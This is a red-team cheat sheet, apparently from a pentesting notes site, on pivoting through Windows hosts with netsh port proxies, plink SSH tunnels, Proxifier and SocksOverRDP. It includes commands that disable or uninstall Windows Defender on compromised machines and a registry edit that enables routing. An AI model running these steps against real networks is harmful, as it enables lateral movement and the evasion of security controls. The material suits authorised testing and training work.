# 🪟 Windows Native Pivoting

> Windows built-in tools and legitimate binaries for pivoting, port forwarding, and SOCKS proxying.

## 📖 Overview

Windows environments often have tools like `netsh` (native), `plink.exe` (PuTTY suite), or modern OpenSSH (Windows 10+) that can be used for pivoting without uploading custom binaries.

## 🔌 netsh – Native Port Forwarding

> Windows built-in TCP port proxy. No additional tools required.

### Add port forward

```bash
netsh interface portproxy add v4tov4 listenport=$LPORT listenaddress=$LHOST connectport=$RPORT connectaddress=$RHOST
```

### Verify configuration

```bash
netsh interface portproxy show v4tov4
```

### Delete port forward

```bash
netsh interface portproxy delete v4tov4 listenport=$LPORT listenaddress=$LHOST
```

### Enable IP forwarding (required for routing)

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f
```

> [!warning] Requires admin privileges.

## 🔌 plink.exe - SSH Tunneling (PuTTY Link)

> Windows command-line SSH client. Useful when OpenSSH is not available.

### Basic dynamic SOCKS proxy

```bash
plink -ssh -D $SOCKS_PORT $PIVOT_USER@$PIVOT_HOST
```

### Port Forwarding

```bash
# Local port forward
plink -ssh -L $LPORT:$TARGET_HOST:$RPORT $PIVOT_USER@$PIVOT_HOST

# Remote port forward
plink -ssh -R $RPORT:127.0.0.1:$LPORT $PIVOT_USER@$PIVOT_HOST
```

### Key-based authentication (PuTTY .ppk format)

```bash
plink -ssh -D $SOCKS_PORT -i C:\keys\$KEY.ppk $PIVOT_USER@$PIVOT_HOST
```

### Background process

```bash
start /B plink -ssh -D $SOCKS_PORT $PIVOT_USER@$PIVOT_HOST
```

### Verify proxy is listening

```bash
netstat -an | findstr :$SOCKS_PORT
```

## 🧩 Proxifier – Route Windows Apps through SOCKS

> Third-party tool (free) that forces any Windows application through a SOCKS proxy.

### Configuration steps

1. **Add SOCKS server**: `127.0.0.1:$SOCKS_PORT` (SOCKS4/5)
2. **Create proxification rule**: Select application (e.g., `mstsc.exe`) and target hosts (e.g., `172.16.5.0/24`)
3. **Enable rules**: Profile → Proxification Rules → Enable

### Common use case: RDP through SOCKS

```bash
# Start plink SOCKS tunnel
plink -ssh -D 9050 $PIVOT_USER@$PIVOT_HOST

# Configure Proxifier to route mstsc.exe through 127.0.0.1:9050
# Then launch Remote Desktop to internal target
mstsc.exe /v:$TARGET_HOST
```

## 🖥️ SocksOverRDP – SOCKS over RDP

> Uses RDP channel to create a SOCKS proxy. Requires plugin on target.

::: details Download SocksOverRDP

```bash
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip SocksOverRDP-x64.zip
unzip ProxifierPE.zip
```

:::

1. RDP to first pivot

```bash
xfreerdp /v:$PIVOT_HOST /u:$USER /p:$PASSWORD
```

2. On pivot – disable Defender & register DLL

```bash
# Disable Windows Defender (GUI or PowerShell)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Register plugin (as Administrator)
regsvr32.exe SocksOverRDP-Plugin.dll
```

3. RDP from pivot to next target

```bash
mstsc.exe /v:$TARGET_HOST
# SocksOverRDP automatically listens on 127.0.0.1:1080
```

4. On target – run server

```bash
# Disable Defender (required)
Uninstall-WindowsFeature -Name Windows-Defender

# Run server as Administrator
.\SocksOverRDP-Server.exe
```

5. Back on pivot – configure Proxifier

```bash
# Launch Proxifier as Administrator
.\Proxifier.exe

# Profile → Proxy Servers → Add
# Address: 127.0.0.1, Port: 1080, Protocol: SOCKS5
```
